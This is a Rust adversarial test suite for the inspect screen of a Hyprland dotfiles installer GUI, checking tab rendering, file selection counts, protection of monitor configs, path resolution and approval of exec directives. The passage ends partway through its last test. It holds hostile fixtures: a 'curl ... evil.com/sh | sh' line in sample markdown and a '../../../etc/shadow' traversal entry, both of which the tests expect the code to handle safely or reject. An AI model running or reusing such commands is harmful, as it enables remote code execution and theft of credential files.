//! Empirical Challenger Adversarial Test Suite for Milestone M3:
//! Screen 2: Repository Inspection, 5-Tab Architecture, Granular File Selection,
//! Hardware Display Invariants, Destination Path Resolution, and Confirmation Modal.

use camino::Utf8PathBuf;
use chrono::Utc;
use iced::Theme;
use std::fs;
use std::os::unix::fs::symlink;
use tokio::sync::mpsc;
use woderrise_core::models::{
    CatalogRepository, ConfigComponent, ConflictStatus, DetectedComponent, HardwareConflictNotice,
    SyntaxFormat,
};
use woderrise_core::paths::XdgPaths;
use woderrise_detect::{ComponentDetection, ProceduralDirective, TreeEntry};
use woderrise_github::{GitTree, GitTreeEntry};
use woderrise_gui::app::{App, EngineEvent, GuiCommand, Message, Screen};
use woderrise_gui::screens::inspect::{view_inspect, InspectAction, InspectState, InspectTab};
use woderrise_gui::widgets::diff::FileDiffReport;

fn create_sample_repo(
    id: u64,
    owner: &str,
    repo: &str,
    components: Vec<ConfigComponent>,
) -> CatalogRepository {
    let detected = components
        .into_iter()
        .map(|c| DetectedComponent {
            component: c,
            syntax_format: match c {
                ConfigComponent::Waybar => SyntaxFormat::Jsonc,
                _ => SyntaxFormat::LegacyConf,
            },
            root_path: match c {
                ConfigComponent::Hyprland
                | ConfigComponent::HyprlandLegacy
                | ConfigComponent::HyprlandLua => "hypr".into(),
                ConfigComponent::Waybar => "waybar".into(),
                ConfigComponent::Hyprlock => "hypr".into(),
                ConfigComponent::Hypridle => "hypr".into(),
                ConfigComponent::Wallpapers => "wallpapers".into(),
                ConfigComponent::Monitors => "hypr".into(),
                ConfigComponent::GtkTheme => "gtk-3.0".into(),
                _ => "config".into(),
            },
            entrypoint: c.default_entrypoint().into(),
            style_file: if c == ConfigComponent::Waybar {
                Some("style.css".into())
            } else {
                None
            },
            file_count: 2,
            total_size_bytes: 4096,
        })
        .collect();

    CatalogRepository {
        id,
        owner: owner.to_string(),
        repo: repo.to_string(),
        full_name: format!("{}/{}", owner, repo),
        html_url: format!("https://github.com/{}/{}", owner, repo),
        description: Some(format!("Adversarial test dotfiles for {}/{}", owner, repo)),
        stargazers_count: 1420,
        default_branch: "main".to_string(),
        topics: vec!["hyprland".into(), "waybar".into()],
        pushed_at: Some(Utc::now()),
        cached_tree_sha: None,
        etag: None,
        detected_components: detected,
    }
}

fn count_files_recursive(dir: &std::path::Path) -> usize {
    let mut count = 0;
    if let Ok(entries) = fs::read_dir(dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_dir() {
                count += count_files_recursive(&path);
            } else if path.is_file() {
                count += 1;
            }
        }
    }
    count
}

/// Challenge 1: Clean Tab Switching across all 5 InspectTab tabs and Headless View Rendering
///
/// Invariants:
/// - `InspectTab::ALL` contains exactly 5 variants in order: Overview, Components, FileTree, Readme, DiffAndInstall.
/// - Selecting any tab via `InspectAction::SelectTab` or `Message::SelectInspectTab` updates `active_tab`.
/// - `view_inspect` renders successfully without panicking across all 5 tabs in both Dark and Light themes.
/// - Extreme view states (empty Markdown, huge Markdown, empty Tree, filtered Tree, previewing file) render cleanly.
#[tokio::test]
async fn test_challenge_inspect_tab_switching_and_view_rendering() {
    let (cmd_tx, mut cmd_rx) = mpsc::channel(50);
    let mut app = App::new(cmd_tx, None);
    while cmd_rx.try_recv().is_ok() {}

    let repo = create_sample_repo(
        1001,
        "adversary",
        "desktop-rice",
        vec![ConfigComponent::Hyprland, ConfigComponent::Waybar],
    );

    let _ = app.update(Message::SelectRepo(repo.clone()));
    assert_eq!(app.active_screen, Screen::Inspect);
    let _ = cmd_rx.recv().await;

    // Verify InspectTab enum invariants
    assert_eq!(InspectTab::ALL.len(), 5);
    assert_eq!(InspectTab::ALL[0], InspectTab::Overview);
    assert_eq!(InspectTab::ALL[1], InspectTab::Components);
    assert_eq!(InspectTab::ALL[2], InspectTab::FileTree);
    assert_eq!(InspectTab::ALL[3], InspectTab::Readme);
    assert_eq!(InspectTab::ALL[4], InspectTab::DiffAndInstall);

    // Initial state tab must be Overview
    let inspect = app.inspect_state.as_ref().unwrap();
    assert_eq!(inspect.active_tab, InspectTab::Overview);

    // Stress test switching across all 5 tabs and rendering in both Light and Dark themes
    for &tab in &InspectTab::ALL {
        let _ = app.update(Message::InspectAction(InspectAction::SelectTab(tab)));
        assert_eq!(app.inspect_state.as_ref().unwrap().active_tab, tab);

        let inspect_ref = app.inspect_state.as_ref().unwrap();

        // Render with Dark theme
        let _dark_el = view_inspect(inspect_ref, &Theme::Dark, Message::InspectAction);

        // Render with Light theme
        let _light_el = view_inspect(inspect_ref, &Theme::Light, Message::InspectAction);
    }

    // Stress test README view with markdown variants
    if let Some(inspect) = &mut app.inspect_state {
        inspect.active_tab = InspectTab::Readme;

        // Variant A: Corrupt / extreme markdown with headers, code blocks, tables
        let extreme_md = "# Title\n\n```bash\ncurl -fsSL https://evil.com/sh | sh\n```\n\n| Col1 | Col2 |\n|---|---|\n| val1 | val2 |\n\n[Link](https://example.com)";
        inspect.set_markdown(extreme_md.to_string());
        assert_eq!(inspect.markdown_source.as_deref(), Some(extreme_md));
        assert!(!inspect.parsed_markdown.is_empty());
        let _ = view_inspect(inspect, &Theme::Dark, Message::InspectAction);
        let _ = view_inspect(inspect, &Theme::Light, Message::InspectAction);

        // Variant B: Empty markdown source
        inspect.set_markdown("".to_string());
        assert!(inspect.parsed_markdown.is_empty());
        let _ = view_inspect(inspect, &Theme::Dark, Message::InspectAction);

        // Variant C: Loading state
        inspect.markdown_source = None;
        inspect.parsed_markdown.clear();
        inspect.is_loading = true;
        let _ = view_inspect(inspect, &Theme::Dark, Message::InspectAction);
    }

    // Stress test FileTree view with filtering and selected files
    if let Some(inspect) = &mut app.inspect_state {
        inspect.active_tab = InspectTab::FileTree;
        inspect.full_tree_entries = vec![
            TreeEntry::new("hypr/hyprland.conf", "100644", "blob", "s1", Some(1024)),
            TreeEntry::new("hypr/binds.conf", "100644", "blob", "s2", Some(512)),
            TreeEntry::new("waybar/config.jsonc", "100644", "blob", "s3", Some(2048)),
            TreeEntry::new("waybar/style.css", "100644", "blob", "s4", Some(768)),
        ];

        // Variant A: Filter matches subset
        inspect.tree_filter = "waybar".into();
        let _ = view_inspect(inspect, &Theme::Dark, Message::InspectAction);

        // Variant B: Filter matches nothing
        inspect.tree_filter = "nonexistent_pattern".into();
        let _ = view_inspect(inspect, &Theme::Dark, Message::InspectAction);

        // Variant C: Previewing file with content
        inspect.tree_filter.clear();
        inspect.preview_file = Some("hypr/hyprland.conf".into());
        inspect.preview_content = Some("autogenerated config\nexec-once = waybar\n".into());
        let _ = view_inspect(inspect, &Theme::Dark, Message::InspectAction);

        // Variant D: Preview file while streaming
        inspect.is_fetching_file = true;
        inspect.preview_content = None;
        let _ = view_inspect(inspect, &Theme::Dark, Message::InspectAction);
    }
}

/// Challenge 2: Granular Selection Model, Dynamic File Counts, and Byte Math
///
/// Invariants:
/// - Toggling an individual file adds it to `deselected_files` and decrements `selected_file_count` and `selected_total_bytes`.
/// - Toggling it again removes it from `deselected_files` and restores counts.
/// - `select_all_components()` clears `deselected_files` and selects all components (except Monitors).
/// - `deselect_all_components()` clears `selected_components` and sets counts to 0.
/// - `is_install_allowed()` returns false when 0 files or 0 components are selected, or while loading.
/// - Dynamic counts handle raw detections with matched entries, fallback entrypoints, and bare catalog components without underflowing.
#[test]
fn test_challenge_granular_file_selection_dynamics_and_counting_math() {
    let repo = create_sample_repo(
        2002,
        "custom",
        "rice",
        vec![ConfigComponent::Hyprland, ConfigComponent::Waybar],
    );

    let mut inspect = InspectState::new(repo, vec![], vec![]);

    // Configure raw detections with specific file sizes
    inspect.raw_detections = vec![
        ComponentDetection {
            component: ConfigComponent::Hyprland,
            syntax_format: SyntaxFormat::LegacyConf,
            root_path: "hypr".into(),
            entrypoint: "hyprland.conf".into(),
            style_file: None,
            matched_entries: vec![
                TreeEntry::new("hypr/hyprland.conf", "100644", "blob", "h1", Some(1000)),
                TreeEntry::new("hypr/animations.conf", "100644", "blob", "h2", Some(500)),
                TreeEntry::new("hypr/windowrules.conf", "100644", "blob", "h3", Some(300)),
            ],
            file_count: 3,
            total_size_bytes: 1800,
            hardware_notices: vec![],
        },
        ComponentDetection {
            component: ConfigComponent::Waybar,
            syntax_format: SyntaxFormat::Jsonc,
            root_path: "waybar".into(),
            entrypoint: "config.jsonc".into(),
            style_file: Some("style.css".into()),
            matched_entries: vec![
                TreeEntry::new("waybar/config.jsonc", "100644", "blob", "w1", Some(1200)),
                TreeEntry::new("waybar/style.css", "100644", "blob", "w2", Some(800)),
            ],
            file_count: 2,
            total_size_bytes: 2000,
            hardware_notices: vec![],
        },
    ];

    // Base state: 5 files selected, 3800 bytes
    assert_eq!(inspect.selected_file_count(), 5);
    assert_eq!(inspect.selected_total_bytes(), 3800);
    assert!(inspect.is_install_allowed());

    // Step 1: Deselect a single file from Hyprland (hypr/animations.conf: 500 bytes)
    inspect.toggle_file("hypr/animations.conf", ConfigComponent::Hyprland);
    assert!(!inspect.is_file_selected("hypr/animations.conf", ConfigComponent::Hyprland));
    assert_eq!(inspect.selected_file_count(), 4);
    assert_eq!(inspect.selected_total_bytes(), 3300);
    assert!(inspect.is_install_allowed());

    // Step 2: Deselect a single file from Waybar (waybar/style.css: 800 bytes)
    inspect.toggle_file("waybar/style.css", ConfigComponent::Waybar);
    assert!(!inspect.is_file_selected("waybar/style.css", ConfigComponent::Waybar));
    assert_eq!(inspect.selected_file_count(), 3);
    assert_eq!(inspect.selected_total_bytes(), 2500);

    // Step 3: Deselect a second file from Hyprland (hypr/windowrules.conf: 300 bytes)
    inspect.toggle_file("hypr/windowrules.conf", ConfigComponent::Hyprland);
    assert_eq!(inspect.selected_file_count(), 2);
    assert_eq!(inspect.selected_total_bytes(), 2200);

    // Step 4: Toggle off entire Hyprland component
    inspect.toggle_component(ConfigComponent::Hyprland);
    assert!(!inspect
        .selected_components
        .contains(&ConfigComponent::Hyprland));
    // Only Waybar remains (1 file: config.jsonc: 1200 bytes)
    assert_eq!(inspect.selected_file_count(), 1);
    assert_eq!(inspect.selected_total_bytes(), 1200);

    // Step 5: Toggle Hyprland back on -> previous file deselections must be preserved!
    inspect.toggle_component(ConfigComponent::Hyprland);
    assert!(inspect
        .selected_components
        .contains(&ConfigComponent::Hyprland));
    // Hyprland has 1 file active (hyprland.conf: 1000) + Waybar has 1 file (1200) = 2 files, 2200 bytes
    assert_eq!(inspect.selected_file_count(), 2);
    assert_eq!(inspect.selected_total_bytes(), 2200);
    assert!(!inspect.is_file_selected("hypr/animations.conf", ConfigComponent::Hyprland));
    assert!(!inspect.is_file_selected("hypr/windowrules.conf", ConfigComponent::Hyprland));

    // Step 6: Toggling a deselected file when component is active restores it
    inspect.toggle_file("hypr/animations.conf", ConfigComponent::Hyprland);
    assert!(inspect.is_file_selected("hypr/animations.conf", ConfigComponent::Hyprland));
    assert_eq!(inspect.selected_file_count(), 3);
    assert_eq!(inspect.selected_total_bytes(), 2700);

    // Step 7: Deselect all components
    inspect.deselect_all_components();
    assert_eq!(inspect.selected_file_count(), 0);
    assert_eq!(inspect.selected_total_bytes(), 0);
    assert!(
        !inspect.is_install_allowed(),
        "Install must not be allowed when 0 files/components selected"
    );

    // Step 8: Select all components -> resets deselected_files and selects all valid components
    inspect.select_all_components();
    assert_eq!(inspect.selected_file_count(), 5);
    assert_eq!(inspect.selected_total_bytes(), 3800);
    assert!(inspect.is_install_allowed());

    // Step 9: Edge case - Fallback counting when matched_entries is empty
    let mut bare_inspect = InspectState::new(
        create_sample_repo(2003, "bare", "dots", vec![ConfigComponent::Hyprland]),
        vec![],
        vec![],
    );
    bare_inspect.raw_detections = vec![ComponentDetection {
        component: ConfigComponent::Hyprland,
        syntax_format: SyntaxFormat::LegacyConf,
        root_path: "hypr".into(),
        entrypoint: "hyprland.conf".into(),
        style_file: None,
        matched_entries: vec![], // Empty matched entries: per-file size not available
        file_count: 1,
        total_size_bytes: 4096,
        hardware_notices: vec![],
    }];

    assert_eq!(bare_inspect.selected_file_count(), 1);
    assert_eq!(bare_inspect.selected_total_bytes(), 4096);
    // Deselecting the single entrypoint reduces file count to 0, preventing installation
    bare_inspect.toggle_file("hyprland.conf", ConfigComponent::Hyprland);
    assert_eq!(bare_inspect.selected_file_count(), 0);
    assert!(!bare_inspect.is_install_allowed());

    // Deselecting the component clears total bytes to 0
    bare_inspect.deselect_all_components();
    assert_eq!(bare_inspect.selected_total_bytes(), 0);
}

/// Challenge 3: Hardware Display Preservation Boundary
///
/// Invariants:
/// - `ConfigComponent::Monitors` MUST NEVER be auto-selected in `InspectState::new`.
/// - `select_all_components()` MUST NEVER select `ConfigComponent::Monitors`.
/// - `EngineEvent::TreeLoaded` MUST NEVER auto-select `ConfigComponent::Monitors`.
/// - Files named `monitors.conf`, `workspaces.conf`, `hardware.conf` MUST be classified as `ConflictStatus::HardwareProtected`.
/// - Even if the user manually opts in via `toggle_component(ConfigComponent::Monitors)`, `SecurityAuditor` MUST maintain `is_hardware_protected = true`.
#[tokio::test]
async fn test_challenge_hardware_display_preservation_boundary() {
    let repo = create_sample_repo(
        3003,
        "adversary",
        "displays-override-rice",
        vec![
            ConfigComponent::Hyprland,
            ConfigComponent::Waybar,
            ConfigComponent::Monitors,
        ],
    );

    let hw_notice = HardwareConflictNotice {
        file_path: Utf8PathBuf::from("~/.config/hypr/monitors.conf"),
        description: "Monitors layout detected".into(),
        preserved_by_default: true,
    };

    // 1. InspectState::new invariant
    let mut inspect = InspectState::new(repo.clone(), vec![], vec![hw_notice.clone()]);
    assert!(
        !inspect
            .selected_components
            .contains(&ConfigComponent::Monitors),
        "Hardware violation: ConfigComponent::Monitors was auto-selected in InspectState::new!"
    );
    assert!(inspect
        .selected_components
        .contains(&ConfigComponent::Hyprland));
    assert!(inspect
        .selected_components
        .contains(&ConfigComponent::Waybar));

    // 2. select_all_components invariant
    inspect.select_all_components();
    assert!(
        !inspect
            .selected_components
            .contains(&ConfigComponent::Monitors),
        "Hardware violation: ConfigComponent::Monitors was selected by select_all_components()!"
    );

    // 3. EngineEvent::TreeLoaded invariant in App::update
    let (cmd_tx, mut cmd_rx) = mpsc::channel(20);
    let mut app = App::new(cmd_tx, None);
    while cmd_rx.try_recv().is_ok() {}

    let _ = app.update(Message::SelectRepo(repo.clone()));
    let _ = cmd_rx.recv().await;

    let tree_response = GitTree {
        sha: "tree_sha".into(),
        url: Some("tree_url".into()),
        truncated: false,
        tree: vec![
            GitTreeEntry {
                path: "hypr/hyprland.conf".into(),
                mode: "100644".into(),
                entry_type: "blob".into(),
                sha: "sha1".into(),
                size: Some(1024),
                url: None,
            },
            GitTreeEntry {
                path: "hypr/monitors.conf".into(),
                mode: "100644".into(),
                entry_type: "blob".into(),
                sha: "sha2".into(),
                size: Some(512),
                url: None,
            },
        ],
    };

    let detections = vec![
        ComponentDetection {
            component: ConfigComponent::Hyprland,
            syntax_format: SyntaxFormat::LegacyConf,
            root_path: "hypr".into(),
            entrypoint: "hyprland.conf".into(),
            style_file: None,
            matched_entries: vec![TreeEntry::new(
                "hypr/hyprland.conf",
                "100644",
                "blob",
                "sha1",
                Some(1024),
            )],
            file_count: 1,
            total_size_bytes: 1024,
            hardware_notices: vec![],
        },
        ComponentDetection {
            component: ConfigComponent::Monitors,
            syntax_format: SyntaxFormat::LegacyConf,
            root_path: "hypr".into(),
            entrypoint: "monitors.conf".into(),
            style_file: None,
            matched_entries: vec![TreeEntry::new(
                "hypr/monitors.conf",
                "100644",
                "blob",
                "sha2",
                Some(512),
            )],
            file_count: 1,
            total_size_bytes: 512,
            hardware_notices: vec![hw_notice],
        },
    ];

    let _ = app.update(Message::Engine(EngineEvent::TreeLoaded {
        repo: repo.resolved_full_name(),
        tree: tree_response,
        detections: detections.clone(),
    }));

    let app_inspect = app.inspect_state.as_ref().unwrap();
    assert!(
        !app_inspect
            .selected_components
            .contains(&ConfigComponent::Monitors),
        "Hardware violation: EngineEvent::TreeLoaded auto-selected ConfigComponent::Monitors!"
    );

    // 4. Destination resolution and conflict audit check
    let temp = tempfile::tempdir().unwrap();
    let base = Utf8PathBuf::from_path_buf(temp.path().to_path_buf()).unwrap();
    let xdg = XdgPaths::custom(&base);
    fs::create_dir_all(&xdg.config_home).unwrap();

    let mut state = InspectState::new(repo, vec![], vec![]);
    state.raw_detections = detections;

    // Explicit manual opt-in by user
    state.toggle_component(ConfigComponent::Monitors);
    assert!(state
        .selected_components
        .contains(&ConfigComponent::Monitors));

    let mappings = state.resolve_target_mappings_with_xdg(&xdg);
    let mon_map = mappings
        .iter()
        .find(|m| m.relative_path.as_str().contains("monitors.conf"))
        .expect("monitors.conf mapping should be present");

    assert_eq!(
        mon_map.conflict_status,
        ConflictStatus::HardwareProtected,
        "monitors.conf must be audited as ConflictStatus::HardwareProtected"
    );
    assert!(
        mon_map.is_hardware_protected,
        "is_hardware_protected must be true for display configs"
    );
}

/// Challenge 4: Destination Path Resolution, Containment, and Conflict Classification
///
/// Invariants:
/// - Valid configurations map into designated `$XDG_CONFIG_HOME/<component>/` destinations.
/// - Unsaved destinations evaluate to `ConflictStatus::NewFile`.
/// - Existing destination regular files evaluate to `ConflictStatus::OverwritingExisting`.
/// - Existing symlinks (e.g. GNU Stow or Chezmoi) evaluate to `ConflictStatus::ExistingSymlink`.
/// - Path traversal attempts (`../../etc/shadow`) are strictly blocked and produce no target mapping.
/// - Executable modes (`100755`) and script extensions (`.sh`, `.py`) are rejected.
/// - Git tree symlink objects (`mode 120000`) are blocked.
#[test]
fn test_challenge_destination_path_resolution_and_conflict_audit() {
    let temp = tempfile::tempdir().unwrap();
    let base = Utf8PathBuf::from_path_buf(temp.path().to_path_buf()).unwrap();
    let xdg = XdgPaths::custom(&base);
    let config_home = xdg.config_home.clone();
    fs::create_dir_all(&config_home).unwrap();

    let repo = create_sample_repo(
        4004,
        "author",
        "rice",
        vec![ConfigComponent::Hyprland, ConfigComponent::Waybar],
    );

    let mut inspect = InspectState::new(repo, vec![], vec![]);

    // 1. Setup host filesystem with:
    //    - Non-existent file: hypr/hyprland.conf (expect NewFile)
    //    - Existing file: waybar/config.jsonc (expect OverwritingExisting)
    //    - Existing symlink: waybar/style.css -> /tmp/some_css (expect ExistingSymlink)
    let waybar_dir = config_home.join("waybar");
    fs::create_dir_all(&waybar_dir).unwrap();

    let existing_cfg = waybar_dir.join("config.jsonc");
    fs::write(&existing_cfg, "/* existing local waybar config */").unwrap();

    let symlink_target = temp.path().join("external_style.css");
    fs::write(&symlink_target, "/* external css */").unwrap();
    let existing_symlink = waybar_dir.join("style.css");
    symlink(&symlink_target, &existing_symlink).unwrap();

    // 2. Set raw detections including benign files and adversarial attack payloads
    inspect.raw_detections = vec![
        ComponentDetection {
            component: ConfigComponent::Hyprland,
            syntax_format: SyntaxFormat::LegacyConf,
            root_path: "hypr".into(),
            entrypoint: "hyprland.conf".into(),
            style_file: None,
            matched_entries: vec![
                TreeEntry::new("hyprland.conf", "100644", "blob", "s1", Some(1024)),
                // Attack 1: Path Traversal
                TreeEntry::new("../../../etc/shadow", "100644", "blob", "s2", Some(1024)),
                // Attack 2: Executable Script
                TreeEntry::new("setup.sh", "100755", "blob", "s3", Some(2048)),
                // Attack 3: Git tree symlink object (CVE-2021-21300)
                TreeEntry::new("payload_symlink", "120000", "blob", "s4", Some(32)),
            ],
            file_count: 4,
            total_size_bytes: 4128,
            hardware_notices: vec![],
        },
        ComponentDetection {
            component: ConfigComponent::Waybar,
            syntax_format: SyntaxFormat::Jsonc,
            root_path: "waybar".into(),
            entrypoint: "config.jsonc".into(),
            style_file: Some("style.css".into()),
            matched_entries: vec![
                TreeEntry::new("config.jsonc", "100644", "blob", "s5", Some(1200)),
                TreeEntry::new("style.css", "100644", "blob", "s6", Some(800)),
            ],
            file_count: 2,
            total_size_bytes: 2000,
            hardware_notices: vec![],
        },
    ];

    inspect
        .selected_components
        .insert(ConfigComponent::Hyprland);
    inspect.selected_components.insert(ConfigComponent::Waybar);

    let mappings = inspect.resolve_target_mappings_with_xdg(&xdg);

    // Assert that ALL 3 adversarial attack payloads were rejected and not mapped!
    assert_eq!(
        mappings.len(),
        3,
        "Expected exactly 3 valid mappings; hostile payloads must be audited and rejected"
    );

    // Assert hyprland.conf -> NewFile
    let hypr_map = mappings
        .iter()
        .find(|m| m.relative_path.as_str() == "hyprland.conf")
        .expect("hyprland.conf should be mapped");
    assert_eq!(
        hypr_map.target_destination,
        config_home.join("hypr/hyprland.conf")
    );
    assert_eq!(hypr_map.conflict_status, ConflictStatus::NewFile);

    // Assert waybar/config.jsonc -> OverwritingExisting
    let waybar_cfg_map = mappings
        .iter()
        .find(|m| m.relative_path.as_str() == "config.jsonc")
        .expect("config.jsonc should be mapped");
    assert_eq!(
        waybar_cfg_map.target_destination,
        config_home.join("waybar/config.jsonc")
    );
    assert_eq!(
        waybar_cfg_map.conflict_status,
        ConflictStatus::OverwritingExisting
    );

    // Assert waybar/style.css -> ExistingSymlink pointing to canonical target (preserving GNU Stow symlinks)
    let waybar_style_map = mappings
        .iter()
        .find(|m| m.relative_path.as_str() == "style.css")
        .expect("style.css should be mapped");
    let canonical_target =
        Utf8PathBuf::from_path_buf(symlink_target.canonicalize().unwrap()).unwrap();
    assert_eq!(waybar_style_map.target_destination, canonical_target);
    assert_eq!(
        waybar_style_map.conflict_status,
        ConflictStatus::ExistingSymlink
    );
}

/// Challenge 5: Confirmation Modal, Procedural Directives, and Staging Gate
///
/// Invariants:
/// - `show_confirm_dialog` is false initially.
/// - Opening modal sets `show_confirm_dialog = true`.
/// - Cancelling modal sets `show_confirm_dialog = false` and stays on `Screen::Inspect`.
/// - Procedural directives (`exec-once`, `exec`, `on-click`) are unchecked (neutralized) by default.
/// - Confirming install from modal transitions to `Screen::Install` and initiates staging.
/// - During staging in `Message::InitiateInstall`, only approved directives receive `approved = true`.
/// - Any files in `deselected_files` are strictly filtered out of the staging tree entries.
#[tokio::test]
async fn test_challenge_confirmation_modal_and_directive_safety() {
    let (cmd_tx, mut cmd_rx) = mpsc::channel(20);
    let mut app = App::new(cmd_tx, None);
    while cmd_rx.try_recv().is_ok() {}

    let repo = create_sample_repo(
        5005,
        "author",
        "rice-with-directives",
        vec![ConfigComponent::Hyprland],
    );

    let _ = app.update(Message::SelectRepo(repo));
    let _ = cmd_rx.recv().await;

    let directives = vec![
        ProceduralDirective {
            directive_type: "exec-once".into(),
            command: "waybar &".into(),
            file: "hyprland.conf".into(),
            line: 5,
        },
        ProceduralDirective {
            directive_type: "exec".into(),
            command: "swww-daemon &".into(),
            file: "hyprland.conf".into(),
            line: 12,
        },
    ];

    let raw_entries = vec![
        TreeEntry::new("hypr/hyprland.conf", "100644", "blob", "s1", Some(1024)),
        TreeEntry::new("hypr/ignored.conf", "100644", "blob", "s2", Some(512)),
    ];

    if let Some(inspect) = &mut app.inspect_state {
        inspect.procedural_directives = directives.clone();
        inspect.raw_detections = vec![ComponentDetection {
            component: ConfigComponent::Hyprland,
            syntax_format: SyntaxFormat::LegacyConf,
            root_path: "hypr".into(),
            entrypoint: "hyprland.conf".into(),
            style_file: None,
            matched_entries: raw_entries.clone(),
            file_count: 2,
            total_size_bytes: 1536,
            hardware_notices: vec![],
        }];
        // Deselect "hypr/ignored.conf"
        inspect.toggle_file("hypr/ignored.conf", ConfigComponent::Hyprland);
    }

    // Modal is closed by default
    assert!(!app.inspect_state.as_ref().unwrap().show_confirm_dialog);

    // Open confirm dialog
    let _ = app.update(Message::InspectAction(InspectAction::OpenConfirmDialog));
    assert!(app.inspect_state.as_ref().unwrap().show_confirm_dialog);

    // Directives must be unapproved by default
    assert!(app
        .inspect_state
        .as_ref()
        .unwrap()
        .approved_directives
        .is_empty());

    // User approves ONLY the first directive (index 0: "exec-once = waybar &")
    let _ = app.update(Message::InspectAction(InspectAction::ToggleDirective(0)));
    assert!(app
        .inspect_state
        .as_ref()
        .unwrap()
        .approved_directives
        .contains(&0));
    assert!(!app
        .inspect_state
        .as_ref()
        .unwrap()
        .approved_directives
        .contains(&1));

    // Confirm and apply installation
    let _ = app.update(Message::InspectAction(InspectAction::ConfirmInstall));
    assert_eq!(app.active_screen, Screen::Install);
    assert!(!app.inspect_state.as_ref().unwrap().show_confirm_dialog);

    // Verify StagePackage command was dispatched with filtered entries
    let stage_cmd = cmd_rx.recv().await.expect("StagePackage command expected");
    match stage_cmd {
        GuiCommand::StagePackage { entries, .. } => {
            // Deselected file "hypr/ignored.conf" MUST NOT be in the entries sent for staging!
            assert_eq!(entries.len(), 1);
            assert_eq!(entries[0].path, "hypr/hyprland.conf");
        }
        _ => panic!("Expected StagePackage command"),
    }

    // Verify directive approvals in InstallState:
    // Index 0 approved = true, Index 1 approved = false (neutralized)
    let install = app.install_state.as_ref().unwrap();
    assert_eq!(install.directive_approvals.len(), 2);
    assert!(install.directive_approvals[0].approved);
    assert!(!install.directive_approvals[1].approved);
}

/// Challenge 6: Non-Destructive Inspection Isolation Invariant
///
/// CRITICAL SAFETY INVARIANT:
/// Merely inspecting a repository, switching across all 5 tabs, viewing diffs,
/// expanding trees, or opening confirmation modals MUST NEVER touch, alter, create,
/// or delete any local user configurations in `$XDG_CONFIG_HOME` or `$HOME`.
#[tokio::test]
async fn test_challenge_inspection_isolation_never_touches_user_config() {
    let temp = tempfile::tempdir().unwrap();
    let base = Utf8PathBuf::from_path_buf(temp.path().to_path_buf()).unwrap();
    let xdg = XdgPaths::custom(&base);
    let config_dir = xdg.config_home.clone();
    fs::create_dir_all(&config_dir).unwrap();

    // Create realistic user configuration files in local dotfile directories
    let hypr_conf = config_dir.join("hypr/hyprland.conf");
    fs::create_dir_all(hypr_conf.parent().unwrap()).unwrap();
    let initial_hypr_bytes =
        b"monitor=eDP-1,1920x1080@60,0x0,1\ninput { kb_layout = us }\n".to_vec();
    fs::write(&hypr_conf, &initial_hypr_bytes).unwrap();

    let waybar_conf = config_dir.join("waybar/config.jsonc");
    fs::create_dir_all(waybar_conf.parent().unwrap()).unwrap();
    let initial_waybar_bytes =
        b"{\n  \"layer\": \"top\",\n  \"modules-left\": [\"hyprland/workspaces\"]\n}\n".to_vec();
    fs::write(&waybar_conf, &initial_waybar_bytes).unwrap();

    let initial_file_count = count_files_recursive(config_dir.as_std_path());
    assert_eq!(initial_file_count, 2);

    // Initialize App and run full inspection lifecycle
    let (cmd_tx, mut cmd_rx) = mpsc::channel(50);
    let mut app = App::new(cmd_tx, None);
    while cmd_rx.try_recv().is_ok() {}

    let repo = create_sample_repo(
        6006,
        "catppuccin",
        "hyprland",
        vec![ConfigComponent::Hyprland, ConfigComponent::Waybar],
    );

    let _ = app.update(Message::SelectRepo(repo));
    let _ = cmd_rx.recv().await;

    // Simulate tree loaded event
    let detections = vec![
        ComponentDetection {
            component: ConfigComponent::Hyprland,
            syntax_format: SyntaxFormat::LegacyConf,
            root_path: "hypr".into(),
            entrypoint: "hyprland.conf".into(),
            style_file: None,
            matched_entries: vec![TreeEntry::new(
                "hypr/hyprland.conf",
                "100644",
                "blob",
                "sha1",
                Some(1024),
            )],
            file_count: 1,
            total_size_bytes: 1024,
            hardware_notices: vec![],
        },
        ComponentDetection {
            component: ConfigComponent::Waybar,
            syntax_format: SyntaxFormat::Jsonc,
            root_path: "waybar".into(),
            entrypoint: "config.jsonc".into(),
            style_file: None,
            matched_entries: vec![TreeEntry::new(
                "waybar/config.jsonc",
                "100644",
                "blob",
                "sha2",
                Some(2048),
            )],
            file_count: 1,
            total_size_bytes: 2048,
            hardware_notices: vec![],
        },
    ];

    let _ = app.update(Message::Engine(EngineEvent::TreeLoaded {
        repo: "catppuccin/hyprland".into(),
        tree: GitTree {
            sha: "tree_sha".into(),
            url: None,
            truncated: false,
            tree: vec![
                GitTreeEntry {
                    path: "hypr/hyprland.conf".into(),
                    mode: "100644".into(),
                    entry_type: "blob".into(),
                    sha: "sha1".into(),
                    size: Some(1024),
                    url: None,
                },
                GitTreeEntry {
                    path: "README.md".into(),
                    mode: "100644".into(),
                    entry_type: "blob".into(),
                    sha: "sha_readme".into(),
                    size: Some(512),
                    url: None,
                },
            ],
        },
        detections: detections.clone(),
    }));

    // Simulate README fetch
    let _ = app.update(Message::Engine(EngineEvent::FileContentFetched {
        repo: "catppuccin/hyprland".into(),
        path: "README.md".into(),
        content: b"# Catppuccin Hyprland\nPreview readme".to_vec(),
    }));

    // Simulate Diff computation
    let diff_report =
        FileDiffReport::compute("hypr/hyprland.conf", "local content", "remote content");
    let _ = app.update(Message::Engine(EngineEvent::DiffComputed {
        repo: "catppuccin/hyprland".into(),
        diffs: vec![diff_report],
    }));

    // Traverse all tabs and render views
    for &tab in &InspectTab::ALL {
        let _ = app.update(Message::InspectAction(InspectAction::SelectTab(tab)));
        let inspect_ref = app.inspect_state.as_ref().unwrap();
        let _ = view_inspect(inspect_ref, &Theme::Dark, Message::InspectAction);
        let _ = view_inspect(inspect_ref, &Theme::Light, Message::InspectAction);
    }

    // Perform planning resolution against custom XDG
    let mappings = app
        .inspect_state
        .as_ref()
        .unwrap()
        .resolve_target_mappings_with_xdg(&xdg);
    assert!(!mappings.is_empty());

    // Open and close confirm dialog
    let _ = app.update(Message::InspectAction(InspectAction::OpenConfirmDialog));
    assert!(app.inspect_state.as_ref().unwrap().show_confirm_dialog);
    let inspect_modal = app.inspect_state.as_ref().unwrap();
    let _ = view_inspect(inspect_modal, &Theme::Dark, Message::InspectAction);
    let _ = app.update(Message::InspectAction(InspectAction::CloseConfirmDialog));
    assert!(!app.inspect_state.as_ref().unwrap().show_confirm_dialog);

    // EMPIRICAL SAFETY CHECK:
    // Assert that after all inspection actions, user configurations are completely untouched!
    let final_hypr_bytes = fs::read(&hypr_conf).unwrap();
